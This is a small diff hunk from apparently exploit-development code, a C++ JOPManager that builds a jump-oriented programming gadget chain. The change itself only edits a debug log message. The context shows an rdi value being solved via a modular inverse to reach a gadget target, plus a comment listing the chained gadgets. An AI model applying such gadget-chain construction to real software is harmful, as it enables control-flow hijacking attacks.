@@ -66,7 +66,7 @@ void JOPManager::Build(UINT64 g1Off_, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) 
     // x is now 9^(-1) mod 2^64
 
     rdiForJmp = (target_rdi_jmp - 0xDBB9) * x;
-    DbgLog("[JOP] rdi=0x%llX → verify [rdi*9+0xDBB9]=0x%llX (expect 0x%llX)\n",
+    DbgLog("[JOP] rdi=0x%llX  verify [rdi*9+0xDBB9]=0x%llX (expect 0x%llX)\n",
         rdiForJmp, rdiForJmp * 9 + 0xDBB9, target_rdi_jmp);
 
     // Chain: pop_rcx_rdi (pop1, uses rdi) → pop_rdi (pop2) → pop_rcx (pop3) → pop_rbx (pop4) → gadget2
